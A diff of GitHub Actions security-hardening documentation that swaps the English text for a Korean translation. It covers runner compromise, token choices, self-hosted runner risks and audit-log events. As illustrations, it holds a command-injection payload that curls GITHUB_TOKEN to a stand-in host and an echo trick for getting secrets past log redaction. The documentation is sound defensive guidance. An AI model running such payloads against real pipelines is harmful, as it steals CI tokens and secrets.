-[Scorecards](https://github.com/ossf/scorecard) is an automated security tool that flags risky supply chain practices. You can use the [Scorecards action](https://github.com/marketplace/actions/ossf-scorecard-action) and [starter workflow](https://github.com/actions/starter-workflows) to follow best security practices. Once configured, the Scorecards action runs automatically on repository changes, and alerts developers about risky supply chain practices using the built-in code scanning experience. The Scorecards project runs a number of checks, including script injection attacks, token permissions, and pinned actions.
+[성과 기록표](https://github.com/ossf/scorecard)는 위험한 공급망 사례를 표시하는 자동화된 보안 도구입니다. [성과 기록표 작업](https://github.com/marketplace/actions/ossf-scorecard-action) 및 [시작 워크플로](https://github.com/actions/starter-workflows)를 사용하여 모범 보안 사례를 따라할 수 있습니다. 성과 기록표 작업은 구성되면 리포지토리 변경 시 자동으로 실행되며 기본 제공 코드 검사 환경을 사용하여 위험한 공급망 사례에 대해 개발자에게 경고합니다. 성과 기록표 프로젝트는 스크립트 삽입 공격, 토큰 사용 권한 및 고정된 작업을 비롯한 다양한 검사를 실행합니다.
 
-## Potential impact of a compromised runner
+## 손상된 실행기의 잠재적 영향
 
-These sections consider some of the steps an attacker can take if they're able to run malicious commands on a {% data variables.product.prodname_actions %} runner.
+이 섹션에서는 공격자가 {% data variables.product.prodname_actions %} 실행기에서 악의적인 명령을 실행할 수 있는 경우 수행할 수 있는 몇 가지 단계를 고려합니다.
 
 {% note %}
 
-**Note:** {% data variables.product.prodname_dotcom %}-hosted runners do not scan for malicious code downloaded by a user during their job, such as a compromised third party library.
+**참고:** {% data variables.product.prodname_dotcom %}호스팅 실행기는 손상된 타사 라이브러리와 같이 작업 중에 사용자가 다운로드한 악성 코드를 검사하지 않습니다.
 
 {% endnote %}
 
-### Accessing secrets
+### 비밀에 액세스
 
-Workflows triggered using the `pull_request` event have read-only permissions and have no access to secrets. However, these permissions differ for various event triggers such as `issue_comment`, `issues` and `push`, where the attacker could attempt to steal repository secrets or use the write permission of the job's [`GITHUB_TOKEN`](/actions/reference/authentication-in-a-workflow#permissions-for-the-github_token).
+`pull_request` 이벤트를 사용하여 트리거되는 워크플로에는 읽기 전용 권한이 있으며 비밀에 액세스할 수 없습니다. 그러나 사용 권한은 공격자가 리포지토리 비밀을 도용하거나 작업의 [`GITHUB_TOKEN`](/actions/reference/authentication-in-a-workflow#permissions-for-the-github_token)의 쓰기 권한을 사용하려고 시도할 수 있는 `issue_comment`, `issues` 및 `push`와 같은 다양한 이벤트 트리거와 다릅니다.
 
-- If the secret or token is set to an environment variable, it can be directly accessed through the environment using `printenv`.
-- If the secret is used directly in an expression, the generated shell script is stored on-disk and is accessible.
-- For a custom action, the risk can vary depending on how a program is using the secret it obtained from the argument:
+- 비밀 또는 토큰이 환경 변수로 설정된 경우 `printenv`를 사용하여 환경을 통해 직접 액세스할 수 있습니다.
+- 비밀이 식에서 직접 사용되는 경우 생성된 셸 스크립트는 디스크에 저장되고 액세스할 수 있습니다.
+- 사용자 지정 작업의 경우 프로그램이 인수에서 얻은 비밀을 사용하는 방법에 따라 위험이 달라질 수 있습니다.
 
   {% raw %}
   ```
@@ -237,154 +240,151 @@ Workflows triggered using the `pull_request` event have read-only permissions an
   ```
   {% endraw %}
 
-Although {% data variables.product.prodname_actions %} scrubs secrets from memory that are not referenced in the workflow (or an included action), the `GITHUB_TOKEN` and any referenced secrets can be harvested by a determined attacker.
+{% data variables.product.prodname_actions %}은 워크플로(또는 포함된 작업)에서 참조되지 않은 메모리에서 비밀을 스크럽하지만 확인된 공격자가 `GITHUB_TOKEN` 및 참조된 비밀을 수집할 수 있습니다.
 
-### Exfiltrating data from a runner
+### 실행기에서 데이터 유출
 
-An attacker can exfiltrate any stolen secrets or other data from the runner. To help prevent accidental secret disclosure, {% data variables.product.prodname_actions %} [automatically redact secrets printed to the log](/actions/reference/encrypted-secrets#accessing-your-secrets), but this is not a true security boundary because secrets can be intentionally sent to the log. For example, obfuscated secrets can be exfiltrated using `echo ${SOME_SECRET:0:4}; echo ${SOME_SECRET:4:200};`. In addition, since the attacker may run arbitrary commands, they could use HTTP requests to send secrets or other repository data to an external server.
+공격자는 실행기에서 도난당한 비밀 또는 기타 데이터를 유출할 수 있습니다. 실수로 인한 비밀 공개를 방지하기 위해 {% data variables.product.prodname_actions %}은 [로그에 인쇄된 비밀을 자동으로 수정](/actions/reference/encrypted-secrets#accessing-your-secrets)하지만 비밀이 의도적으로 로그로 전송될 수 있으므로 이는 진정한 보안 경계가 아닙니다. 예를 들어 난독 처리된 비밀은 `echo ${SOME_SECRET:0:4}; echo ${SOME_SECRET:4:200};`을 사용하여 유출할 수 있습니다. 또한 공격자가 임의의 명령을 실행할 수 있으므로 HTTP 요청을 사용하여 비밀 또는 기타 리포지토리 데이터를 외부 서버로 보낼 수 있습니다.
 
-### Stealing the job's `GITHUB_TOKEN`
+### 작업의 `GITHUB_TOKEN` 도용
 
-It is possible for an attacker to steal a job's `GITHUB_TOKEN`. The {% data variables.product.prodname_actions %} runner automatically receives a generated `GITHUB_TOKEN` with permissions that are limited to just the repository that contains the workflow, and the token expires after the job has completed. Once expired, the token is no longer useful to an attacker. To work around this limitation, they can automate the attack and perform it in fractions of a second by calling an attacker-controlled server with the token, for example: `a"; set +e; curl http://example.com?token=$GITHUB_TOKEN;#`.
+공격자가 작업의 `GITHUB_TOKEN`을 도용할 수 있습니다. {% data variables.product.prodname_actions %} 실행기는 워크플로가 포함된 리포지토리로만 제한되는 권한으로 생성된 `GITHUB_TOKEN`을 자동으로 수신하며, 작업이 완료된 후 토큰이 만료됩니다. 토큰은 만료되면 공격자에게 더 이상 유용하지 않습니다. 제한을 해결하기 위해 예를 들어 `a"; set +e; curl http://example.com?token=$GITHUB_TOKEN;#`와 같은 토큰을 사용하여 공격자 제어 서버를 호출하여 공격을 자동화하고 1초 단위로 수행할 수 있습니다.
 
-### Modifying the contents of a repository
+### 리포지토리의 콘텐츠 수정
 
-The attacker server can use the {% ifversion fpt or ghec %}{% data variables.product.prodname_dotcom %}{% else %}{% data variables.product.product_name %}{% endif %} API to [modify repository content](/actions/reference/authentication-in-a-workflow#permissions-for-the-github_token), including releases, if the assigned permissions of `GITHUB_TOKEN` [are not restricted](/actions/reference/authentication-in-a-workflow#modifying-the-permissions-for-the-github_token).
+공격자 서버는 `GITHUB_TOKEN`의 할당된 권한이 [제한되지 않은 경우](/actions/reference/authentication-in-a-workflow#modifying-the-permissions-for-the-github_token) {% ifversion fpt or ghec %}{% data variables.product.prodname_dotcom %}{% else %}{% data variables.product.product_name %}{% endif %} API를 사용하여 릴리스를 포함한 [리포지토리 콘텐츠를 수정](/actions/reference/authentication-in-a-workflow#permissions-for-the-github_token)할 수 있습니다.
 
-## Considering cross-repository access
+## 리포지토리 간 액세스 고려
 
-{% data variables.product.prodname_actions %} is intentionally scoped for a single repository at a time. The `GITHUB_TOKEN` grants the same level of access as a write-access user, because any write-access user can access this token by creating or modifying a workflow file, elevating the permissions of the `GITHUB_TOKEN` if necessary. Users have specific permissions for each repository, so allowing the `GITHUB_TOKEN` for one repository to grant access to another would impact the {% data variables.product.prodname_dotcom %} permission model if not implemented carefully. Similarly, caution must be taken when adding {% data variables.product.prodname_dotcom %} authentication tokens to a workflow, because this can also affect the {% data variables.product.prodname_dotcom %} permission model by inadvertently granting broad access to collaborators.
+{% data variables.product.prodname_actions %}은 한 번에 하나의 리포지토리에 대해 의도적으로 범위가 지정됩니다. 모든 쓰기 액세스 사용자가 워크플로 파일을 만들거나 수정하거나, 필요한 경우 `GITHUB_TOKEN`의 사용 권한을 승격하여 `GITHUB_TOKEN`에 액세스할 수 있으므로 이 토큰은 쓰기 액세스 사용자와 동일한 수준의 액세스 권한을 부여합니다. 사용자는 각 리포지토리에 대해 특정 권한을 가지므로 한 리포지토리에 대한 `GITHUB_TOKEN`에 다른 리포지토리에 대한 액세스 권한을 부여하도록 허용 하면 신중하게 구현되지 않은 경우 {% data variables.product.prodname_dotcom %} 권한 모델에 영향을 줄 수 있습니다. 마찬가지로 워크플로에 {% data variables.product.prodname_dotcom %} 인증 토큰을 추가할 때는 주의해야 합니다. 이는 공동 작업자에게 광범위한 액세스 권한을 실수로 부여하여 {% data variables.product.prodname_dotcom %} 권한 모델에도 영향을 줄 수 있기 때문입니다.
 
-We have [a plan on the {% data variables.product.prodname_dotcom %} roadmap](https://github.com/github/roadmap/issues/74) to support a flow that allows cross-repository access within {% data variables.product.product_name %}, but this is not yet a supported feature. Currently, the only way to perform privileged cross-repository interactions is to place a {% data variables.product.prodname_dotcom %} authentication token or SSH key as a secret within the workflow. Because many authentication token types do not allow for granular access to specific resources, there is significant risk in using the wrong token type, as it can grant much broader access than intended.
+[{% data variables.product.prodname_dotcom %} 로드맵에 대한 계획](https://github.com/github/roadmap/issues/74)은 {% data variables.product.product_name %} 내에서 리포지토리 간 액세스를 허용하는 흐름을 지원하지만 아직 지원되는 기능은 아닙니다. 현재 권한 있는 리포지토리 간 상호 작용을 수행하는 유일한 방법은 {% data variables.product.prodname_dotcom %} 인증 토큰 또는 SSH 키를 워크플로 내에서 비밀로 배치하는 것입니다. 많은 인증 토큰 유형은 특정 리소스에 대한 세분화된 액세스를 허용하지 않기 때문에 의도한 것보다 훨씬 광범위한 액세스 권한을 부여할 수 있으므로 잘못된 토큰 형식을 사용할 때 상당한 위험이 있습니다.
 
-This list describes the recommended approaches for accessing repository data within a workflow, in descending order of preference:
+이 목록에서는 워크플로 내에서 기본 설정의 내림차순으로 리포지토리 데이터에 액세스하는 데 권장되는 방법을 설명합니다.
 
-1. **The `GITHUB_TOKEN`**
-    -  This token is intentionally scoped to the single repository that invoked the workflow, and can have the same level of access as a write-access user on the repository. The token is created before each job begins and expires when the job is finished. For more information, see "[Authenticating with the GITHUB_TOKEN](/actions/configuring-and-managing-workflows/authenticating-with-the-github_token)."
-    - The `GITHUB_TOKEN` should be used whenever possible.
-2. **Repository deploy key**
-    - Deploy keys are one of the only credential types that grant read or write access to a single repository, and can be used to interact with another repository within a workflow. For more information, see "[Managing deploy keys](/developers/overview/managing-deploy-keys#deploy-keys)."
-    - Note that deploy keys can only clone and push to the repository using Git, and cannot be used to interact with the REST or GraphQL API, so they may not be appropriate for your requirements.
-3. **{% data variables.product.prodname_github_app %} tokens**
-    - {% data variables.product.prodname_github_apps %} can be installed on select repositories, and even have granular permissions on the resources within them. You could create a {% data variables.product.prodname_github_app %} internal to your organization, install it on the repositories you need access to within your workflow, and authenticate as the installation within your workflow to access those repositories.
+1. **`GITHUB_TOKEN`**
+    -  이 토큰은 의도적으로 워크플로를 호출한 단일 리포지토리로 범위가 지정되며 리포지토리의 쓰기 액세스 사용자와 동일한 수준의 액세스 권한을 가질 수 있습니다. 토큰은 각 작업이 시작되기 전에 만들어지고 작업이 완료되면 만료됩니다. 자세한 내용은 “[GITHUB_TOKEN을 사용한 인증](/actions/configuring-and-managing-workflows/authenticating-with-the-github_token)”을 참조하세요.
+    - `GITHUB_TOKEN`은 가능할 때마다 사용되어야 합니다.
+2. **리포지토리 배포 키**
+    - 배포 키는 단일 리포지토리에 대한 읽기 또는 쓰기 액세스 권한을 부여하는 유일한 자격 증명 유형 중 하나이며 워크플로 내에서 다른 리포지토리와 상호 작용하는 데 사용할 수 있습니다. 자세한 내용은 “[배포 키 관리](/developers/overview/managing-deploy-keys#deploy-keys)”를 참조하세요.
+    - 배포 키는 Git을 사용하여 리포지토리에만 복제하고 푸시할 수 있으며 REST 또는 GraphQL API와 상호 작용하는 데 사용할 수 없으므로 요구 사항에 적합하지 않을 수 있습니다.
+3. **{% data variables.product.prodname_github_app %} 토큰**
+    - {% data variables.product.prodname_github_apps %}은 선택 리포지토리에 설치할 수 있으며 해당 리포지토리 내의 리소스에 대한 세분화된 권한을 가질 수도 있습니다. 조직 내부 {% data variables.product.prodname_github_app %}을 만들고, 워크플로 내에서 액세스해야 하는 리포지토리에 설치하고, 워크플로 내에서 설치로 인증하여 해당 리포지토리에 액세스할 수 있습니다.
 4. **{% data variables.product.pat_generic %}s**
-    - You should never use a {% data variables.product.pat_v1 %}. These tokens grant access to all repositories within the organizations that you have access to, as well as all personal repositories in your personal account. This indirectly grants broad access to all write-access users of the repository the workflow is in.
-    - If you do use a {% data variables.product.pat_generic %}, you should never use a {% data variables.product.pat_generic %} from your own account. If you later leave an organization, workflows using this token will immediately break, and debugging this issue can be challenging. Instead, you should use a {% ifversion pat-v2%}{% data variables.product.pat_v2 %}s{% else %}{% data variables.product.pat_generic %}s{% endif %} for a new account that belongs to your organization and that is only granted access to the specific repositories that are needed for the workflow. Note that this approach is not scalable and should be avoided in favor of alternatives, such as deploy keys.
-5. **SSH keys on a personal account**
-    - Workflows should never use the SSH keys on a personal account. Similar to {% data variables.product.pat_v1_plural %}, they grant read/write permissions to all of your personal repositories as well as all the repositories you have access to through organization membership.  This indirectly grants broad access to all write-access users of the repository the workflow is in. If you're intending to use an SSH key because you only need to perform repository clones or pushes, and do not need to interact with public APIs, then you should use individual deploy keys instead.
+    - {% data variables.product.pat_v1 %}을(를) 사용하면 안 됩니다. 토큰은 액세스 권한이 있는 조직 내의 모든 리포지토리와 개인 계정의 모든 개인 리포지토리에 대한 액세스 권한을 부여합니다. 이렇게 하면 워크플로가 있는 리포지토리의 모든 쓰기 액세스 사용자에게 간접적으로 광범위한 액세스 권한이 부여됩니다.
+    - {% data variables.product.pat_generic %}을(를) 사용하는 경우 자신의 계정에서 {% data variables.product.pat_generic %}을(를) 사용하면 안 됩니다. 나중에 조직을 떠날 경우 이 토큰을 사용하는 워크플로가 즉시 중단되고 이 문제를 디버깅하는 것이 어려울 수 있습니다. 대신 조직에 속하고 워크플로에 필요한 특정 리포지토리에 대한 액세스 권한만 부여되는 새 계정에 대해 {% ifversion pat-v2%}{% data variables.product.pat_v2 %}s{% else %}{% data variables.product.pat_generic %}s{% endif %}을(를) 사용해야 합니다. 이 방법은 확장할 수 없으며 배포 키와 같은 대안을 선호하지 않아야 합니다.
+5. **개인 계정의 SSH 키**
+    - 워크플로는 개인 계정에서 SSH 키를 사용하지 않아야 합니다. {% data variables.product.pat_v1_plural %}와 마찬가지로 모든 개인 리포지토리와 조직 멤버 자격을 통해 액세스할 수 있는 모든 리포지토리에 읽기/쓰기 권한을 부여합니다.  이렇게 하면 워크플로가 있는 리포지토리의 모든 쓰기 액세스 사용자에게 간접적으로 광범위한 액세스 권한이 부여됩니다. 리포지토리 복제 또는 푸시만 수행해야 하고 공용 API와 상호 작용할 필요가 없어서 SSH 키를 사용하려는 경우 개별 배포 키를 대신 사용해야 합니다.
 
-## Hardening for self-hosted runners
+## 자체 호스팅 실행기를 위한 강화
 
-{% ifversion fpt or ghec %}
-**{% data variables.product.prodname_dotcom %}-hosted** runners execute code within ephemeral and clean isolated virtual machines, meaning there is no way to persistently compromise this environment, or otherwise gain access to more information than was placed in this environment during the bootstrap process.
+{% ifversion fpt or ghec %} **{% data variables.product.prodname_dotcom %}호스팅** 실행기는 임시 완전 격리된 가상 머신 내에서 코드를 실행합니다. 즉, 이 환경을 영구적으로 손상시키거나 부트스트랩 프로세스 중에 이 환경에 배치된 것보다 더 많은 정보에 액세스할 수 있는 방법이 없습니다.
 {% endif %}
 
-{% ifversion fpt or ghec %}**Self-hosted**{% elsif ghes or ghae %}Self-hosted{% endif %} runners for {% data variables.product.product_name %} do not have guarantees around running in ephemeral clean virtual machines, and can be persistently compromised by untrusted code in a workflow.
+{% data variables.product.product_name %}에 대한 {% ifversion fpt or ghec %}**자체 호스팅**{% elsif ghes or ghae %}자체 호스팅{% endif %} 실행기는 임시 완전 가상 머신에서 실행되는 것을 보장하지 않으며 워크플로에서 신뢰할 수 없는 코드로 인해 지속적으로 손상될 수 있습니다.
 
-{% ifversion fpt or ghec %}As a result, self-hosted runners should almost [never be used for public repositories](/actions/hosting-your-own-runners/about-self-hosted-runners#self-hosted-runner-security) on {% data variables.product.product_name %}, because any user can open pull requests against the repository and compromise the environment. Similarly, be{% elsif ghes or ghae %}Be{% endif %} cautious when using self-hosted runners on private or internal repositories, as anyone who can fork the repository and open a pull request (generally those with read access to the repository) are able to compromise the self-hosted runner environment, including gaining access to secrets and the `GITHUB_TOKEN` which, depending on its settings, can grant write access to the repository. Although workflows can control access to environment secrets by using environments and required reviews, these workflows are not run in an isolated environment and are still susceptible to the same risks when run on a self-hosted runner.
+{% ifversion fpt or ghec %} 따라서 사용자가 리포지토리에 대한 끌어오기 요청을 열고 환경을 손상시킬 수 있으므로 자체 호스팅 실행기는 {% data variables.product.product_name %}의 [퍼블릭 리포지토리에 거의 사용되지 않아야](/actions/hosting-your-own-runners/about-self-hosted-runners#self-hosted-runner-security) 합니다. 마찬가지로,{% elsif ghes or ghae %} {% endif %}리포지토리를 포크하고 끌어오기 요청을 열 수 있는 사람(일반적으로 리포지토리에 대한 읽기 액세스 권한이 있는 사용자)은 비밀 및 `GITHUB_TOKEN`에 대한 액세스 권한을 얻는 것을 포함하여, 설정에 따라 리포지토리에 대한 쓰기 권한을 부여할 수 있는 자체 호스팅 실행기 환경을 손상시킬 수 있으므로 프라이빗 또는 내부 리포지토리에서 자체 호스팅 실행기를 사용할 때 주의해야 합니다. 워크플로는 환경 및 필수 검토를 사용하여 환경 비밀에 대한 액세스를 제어할 수 있지만 워크플로는 격리된 환경에서 실행되지 않으며 자체 호스팅 실행기에서 실행될 때 동일한 위험에 여전히 취약합니다.
 
-When a self-hosted runner is defined at the organization or enterprise level, {% data variables.product.product_name %} can schedule workflows from multiple repositories onto the same runner. Consequently, a security compromise of these environments can result in a wide impact. To help reduce the scope of a compromise, you can create boundaries by organizing your self-hosted runners into separate groups. You can restrict what {% ifversion restrict-groups-to-workflows %}workflows, {% endif %}organizations and repositories can access runner groups. For more information, see "[Managing access to self-hosted runners using groups](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups)."
+조직 또는 엔터프라이즈 수준에서 자체 호스팅 실행기를 정의하면 {% data variables.product.product_name %}는 여러 리포지토리에서 동일한 실행기로 워크플로를 예약할 수 있습니다. 따라서 환경의 보안 손상으로 인해 광범위한 영향을 미칠 수 있습니다. 손상 범위를 줄이기 위해 자체 호스팅 실행기를 별도의 그룹으로 구성하여 경계를 만들 수 있습니다. 실행기 그룹에 액세스할 수 있는 {% ifversion restrict-groups-to-workflows %}워크플로, {% endif %}조직 및 리포지토리를 제한할 수 있습니다. 자세한 내용은 “[그룹을 사용하여 자체 호스팅 실행기에 대한 액세스 관리](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups)”를 참조하세요.
 
-You should also consider the environment of the self-hosted runner machines:
-- What sensitive information resides on the machine configured as a self-hosted runner? For example, private SSH keys, API access tokens, among others.
-- Does the machine have network access to sensitive services? For example, Azure or AWS metadata services. The amount of sensitive information in this environment should be kept to a minimum, and you should always be mindful that any user capable of invoking workflows has access to this environment.
+자체 호스팅 실행기 머신의 환경도 고려해야 합니다.
+- 자체 호스팅 실행기로 구성된 컴퓨터에 있는 중요한 정보는 무엇인가요? 예를 들어 프라이빗 SSH 키, API 액세스 토큰 등이 있습니다.
+- 컴퓨터에 중요한 서비스에 대한 네트워크 액세스 권한이 있나요? 예를 들어 Azure 또는 AWS 메타데이터 서비스입니다. 이 환경에서 중요한 정보의 양을 최소한으로 유지해야 하며, 워크플로를 호출할 수 있는 모든 사용자가 이 환경에 액세스할 수 있다는 점을 항상 염두에 두어야 합니다.
 
-Some customers might attempt to partially mitigate these risks by implementing systems that automatically destroy the self-hosted runner after each job execution. However, this approach might not be as effective as intended, as there is no way to guarantee that a self-hosted runner only runs one job. Some jobs will use secrets as command-line arguments which can be seen by another job running on the same runner, such as `ps x -w`. This can lead to secret leakages.
+일부 고객은 각 작업 실행 후 자체 호스팅 실행기를 자동으로 삭제하는 시스템을 구현하여 해당 위험을 부분적으로 완화하려고 시도할 수 있습니다. 그러나 자체 호스팅 실행기에서 하나의 작업만 실행하도록 보장할 방법이 없으므로 이 방법은 의도한 만큼 효과적이지 않을 수 있습니다. 일부 작업은 같은 실행기에서 실행되는 다른 작업에서 볼 수 있는 명령줄 인수(예: `ps x -w`)로 비밀을 사용합니다. 이로 인해 비밀 누출이 발생할 수 있습니다.
 
-### Planning your management strategy for self-hosted runners
+### 자체 호스팅 실행기를 위한 관리 전략 계획
 
-A self-hosted runner can be added to various levels in your {% data variables.product.prodname_dotcom %} hierarchy: the enterprise, organization, or repository level. This placement determines who will be able to manage the runner:
+자체 호스팅 실행기를 {% data variables.product.prodname_dotcom %} 계층 구조의 다양한 수준(엔터프라이즈, 조직 또는 리포지토리 수준)에 추가할 수 있습니다. 이 배치는 실행기를 관리할 수 있는 사용자를 결정합니다.
 
-**Centralized management:**
-  - If you plan to have a centralized team own the self-hosted runners, then the recommendation is to add your runners at the highest mutual organization or enterprise level. This gives your team a single location to view and manage your runners.
-  - If you only have a single organization, then adding your runners at the organization level is effectively the same approach, but you might encounter difficulties if you add another organization in the future.
+**중앙 집중식 관리**
+  - 중앙 집중식 팀이 자체 호스트 실행기를 소유하도록 하려는 경우 가장 높은 상호 조직 또는 엔터프라이즈 수준에서 실행기를 추가하는 것이 좋습니다. 이를 통해 팀은 실행기를 보고 관리할 수 있는 단일 위치가 생깁니다.
+  - 단일 조직만 있는 경우 조직 수준에서 실행기를 추가하는 것은 사실상 동일한 방법이지만 나중에 다른 조직을 추가하면 문제가 발생할 수 있습니다.
 
-**Decentralized management:**
-  - If each team will manage their own self-hosted runners, then the recommendation is to add the runners at the highest level of team ownership. For example, if each team owns their own organization, then it will be simplest if the runners are added at the organization level too.
-  - You could also add runners at the repository level, but this will add management overhead and also increases the numbers of runners you need, since you cannot share runners between repositories.
+**탈중앙 집중식 관리**
+  - 각 팀이 자체 호스팅 실행기를 관리하는 경우 가장 높은 수준의 팀 소유권에서 실행기를 추가하는 것이 좋습니다. 예를 들어 각 팀이 자체 조직을 소유하는 경우 실행기도 조직 수준에서 추가하면 가장 간단합니다.
+  - 리포지토리 수준에서 실행기를 추가할 수도 있지만 리포지토리 간에 실행기를 공유할 수 없으므로 관리 오버헤드가 추가되고 필요한 실행기 수도 증가합니다.
 
 {% ifversion fpt or ghec or ghes > 3.4 %}
-### Authenticating to your cloud provider
+### 클라우드 공급자에 인증
 
-If you are using {% data variables.product.prodname_actions %} to deploy to a cloud provider, or intend to use HashiCorp Vault for secret management, then its recommended that you consider using OpenID Connect to create short-lived, well-scoped access tokens for your workflow runs. For more information, see "[About security hardening with OpenID Connect](/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect)."
+{% data variables.product.prodname_actions %}을 사용하여 클라우드 공급자에게 배포하거나 비밀 관리에 HashiCorp Vault를 사용하려는 경우 OpenID Connect를 사용하여 워크플로 실행에 대한 단기의, 넓은 범위의 액세스 토큰을 만드는 것이 좋습니다. 자세한 내용은 “[OpenID Connect 보안 강화 정보](/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect)”를 참조하세요.
 
 {% endif %}
 
-## Auditing {% data variables.product.prodname_actions %} events
+## {% data variables.product.prodname_actions %} 이벤트 감사
 
-You can use the audit log to monitor administrative tasks in an organization. The audit log records the type of action, when it was run, and which personal account performed the action.
+감사 로그를 사용하여 조직의 관리 작업을 모니터링할 수 있습니다. 감사 로그는 작업 유형, 실행 시기 및 작업을 수행한 개인 계정을 기록합니다.
 
-For example, you can use the audit log to track the `org.update_actions_secret` event, which tracks changes to organization secrets:
-  ![Audit log entries](/assets/images/help/repository/audit-log-entries.png)
+예를 들어 감사 로그를 사용하여 조직 비밀에 대한 변경 내용을 추적하는 `org.update_actions_secret` 이벤트를 추적할 수 있습니다. ![감사 로그 항목](/assets/images/help/repository/audit-log-entries.png)
 
-The following tables describe the {% data variables.product.prodname_actions %} events that you can find in the audit log. For more information on using the audit log, see
-"[Reviewing the audit log for your organization](/organizations/keeping-your-organization-secure/reviewing-the-audit-log-for-your-organization#searching-the-audit-log)" and "[Reviewing audit logs for your enterprise](/admin/monitoring-activity-in-your-enterprise/reviewing-audit-logs-for-your-enterprise)."
+다음 표에서는 감사 로그에서 찾을 수 있는 {% data variables.product.prodname_actions %} 이벤트에 대해 설명합니다. 감사 로그 사용에 대한 자세한 내용은 “[조직 감사 로그 검토](/organizations/keeping-your-organization-secure/reviewing-the-audit-log-for-your-organization#searching-the-audit-log)” 및 “[엔터프라이즈 감사 로그 검토](/admin/monitoring-activity-in-your-enterprise/reviewing-audit-logs-for-your-enterprise)”를 참조하세요.
 
 {% ifversion fpt or ghec %}
-### Events for environments
+### 환경에 대한 이벤트
 
-| Action | Description
+| 작업 | 설명
 |------------------|-------------------
-| `environment.create_actions_secret` | Triggered when a secret is created in an environment. For more information, see ["Environment secrets](/actions/reference/environments#environment-secrets)."
-| `environment.delete` | Triggered when an environment is deleted. For more information, see ["Deleting an environment](/actions/reference/environments#deleting-an-environment)."
-| `environment.remove_actions_secret` |  Triggered when a secret is removed from an environment. For more information, see ["Environment secrets](/actions/reference/environments#environment-secrets)."
-| `environment.update_actions_secret` | Triggered when a secret in an environment is updated. For more information, see ["Environment secrets](/actions/reference/environments#environment-secrets)."
+| `environment.create_actions_secret` | 환경에서 비밀을 만들 때 트리거됩니다. 자세한 내용은 [“환경 비밀](/actions/reference/environments#environment-secrets)”을 참조하세요.
+| `environment.delete` | 환경이 삭제될 때 트리거됩니다. 자세한 내용은 [“환경 삭제](/actions/reference/environments#deleting-an-environment)”를 참조하세요.
+| `environment.remove_actions_secret` |  환경에서 비밀이 제거될 때 트리거됩니다. 자세한 내용은 [“환경 비밀](/actions/reference/environments#environment-secrets)”을 참조하세요.
+| `environment.update_actions_secret` | 환경의 비밀이 업데이트될 때 트리거됩니다. 자세한 내용은 [“환경 비밀](/actions/reference/environments#environment-secrets)”을 참조하세요.
 {% endif %}
 
 {% ifversion fpt or ghes or ghec %}
-### Events for configuration changes
-| Action | Description
+### 구성 변경에 대한 이벤트
+| 작업 | 설명
 |------------------|-------------------
-| `repo.actions_enabled` | Triggered when {% data variables.product.prodname_actions %} is enabled for a repository. Can be viewed using the UI. This event is not visible when you access the audit log using the REST API. For more information, see "[Using the REST API](#using-the-rest-api)."
-| `repo.update_actions_access_settings` | Triggered when the setting to control how your repository is used by {% data variables.product.prodname_actions %} workflows in other repositories is changed.
+| `repo.actions_enabled` | 리포지토리에 대해 {% data variables.product.prodname_actions %}을 사용할 때 트리거됩니다. UI를 사용하여 볼 수 있습니다. REST API를 사용하여 감사 로그에 액세스할 때는 이 이벤트가 표시되지 않습니다. 자세한 내용은 “[ 사용](#using-the-rest-api)”을 참조하세요.
+| `repo.update_actions_access_settings` | 다른 리포지토리의 {% data variables.product.prodname_actions %} 워크플로에서 리포지토리를 사용하는 방법을 제어하는 설정이 변경될 때 트리거됩니다.
 {% endif %}
 
-### Events for secret management
-| Action | Description
+### 비밀 관리에 대한 이벤트
+| 작업 | 설명
 |------------------|-------------------
-| `org.create_actions_secret` | Triggered when a {% data variables.product.prodname_actions %} secret is created for an organization. For more information, see "[Creating encrypted secrets for an organization](/actions/reference/encrypted-secrets#creating-encrypted-secrets-for-an-organization)."
-| `org.remove_actions_secret` | Triggered when a {% data variables.product.prodname_actions %} secret is removed.
-| `org.update_actions_secret` | Triggered when a {% data variables.product.prodname_actions %} secret is updated.
-| `repo.create_actions_secret ` | Triggered when a {% data variables.product.prodname_actions %} secret is created for a repository. For more information, see "[Creating encrypted secrets for a repository](/actions/reference/encrypted-secrets#creating-encrypted-secrets-for-a-repository)."
-| `repo.remove_actions_secret` | Triggered when a {% data variables.product.prodname_actions %} secret is removed.
-| `repo.update_actions_secret` | Triggered when a {% data variables.product.prodname_actions %} secret is updated.
+| `org.create_actions_secret` | 조직에 대해 {% data variables.product.prodname_actions %} 비밀이 만들어지면 트리거됩니다. 자세한 정보는 “[조직의 암호화된 비밀 만들기](/actions/reference/encrypted-secrets#creating-encrypted-secrets-for-an-organization)”를 참조하세요.
+| `org.remove_actions_secret` | {% data variables.product.prodname_actions %} 비밀이 제거될 때 트리거됩니다.
+| `org.update_actions_secret` | {% data variables.product.prodname_actions %} 비밀이 업데이트될 때 트리거됩니다.
+| `repo.create_actions_secret ` | 리포지토리에 대한 {% data variables.product.prodname_actions %} 비밀이 만들어지면 트리거됩니다. 자세한 정보는 “[리포지토리의 암호화된 비밀 만들기](/actions/reference/encrypted-secrets#creating-encrypted-secrets-for-a-repository)”를 참조하세요.
+| `repo.remove_actions_secret` | {% data variables.product.prodname_actions %} 비밀이 제거될 때 트리거됩니다.
+| `repo.update_actions_secret` | {% data variables.product.prodname_actions %} 비밀이 업데이트될 때 트리거됩니다.
 
-### Events for self-hosted runners
-| Action | Description
+### 자체 호스팅 실행기에 대한 이벤트
+| 작업 | 설명
 |------------------|-------------------
-| `enterprise.register_self_hosted_runner` | Triggered when a new self-hosted runner is registered. For more information, see "[Adding a self-hosted runner to an enterprise](/actions/hosting-your-own-runners/adding-self-hosted-runners#adding-a-self-hosted-runner-to-an-enterprise)."
-| `enterprise.remove_self_hosted_runner` | Triggered when a self-hosted runner is removed.
-| `enterprise.runner_group_runners_updated` | Triggered when a runner group's member list is updated. For more information, see "[Set self-hosted runners in a group for an organization](/rest/reference/actions#set-self-hosted-runners-in-a-group-for-an-organization)."
-| `enterprise.self_hosted_runner_online` | Triggered when the runner application is started. Can only be viewed using the REST API; not visible in the UI or JSON/CSV export. For more information, see "[Checking the status of a self-hosted runner](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner)."
